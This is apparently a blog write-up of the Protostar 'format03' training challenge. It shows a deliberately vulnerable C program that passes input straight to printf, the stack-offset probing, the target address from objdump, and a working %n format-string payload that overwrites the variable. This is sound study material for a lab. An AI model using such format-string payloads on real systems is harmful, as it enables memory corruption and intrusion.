---
layout: post
title: "Protostar format03 error"
tags: [protostar]
comments: false
---

We are given a source code with this challenge.

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

This looked the exact same as format02. 

offset
```
user@protostar:/opt/protostar/bin$ (python -c 'print "AAAA"+"%x."*20') | ./format3 
AAAA0.bffff5d0.b7fd7ff4.0.0.bffff7d8.804849d.bffff5d0.200.b7fd8420.bffff614.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.
target is 00000000 :(
user@protostar:/opt/protostar/bin$ (python -c 'print "AAAA%12$x"') | ./format3AAAA41414141
target is 00000000 :(

```

The offset is 12

address of target
```
user@protostar:/opt/protostar/bin$ objdump -t format3 | grep target
080496f4 g     O .bss   00000004              target
```

attack
```
user@protostar:/opt/protostar/bin$ python -c "print '\xf4\x96\x04\x08' + ' ' + '%1539100x.'*11 + '%n'" | ./format3 

you have modified the target :)
```

I think that the author of this challenge didn't want us to use the exact same way on how we did format02 so if I have time later on I will loook at it more in detail.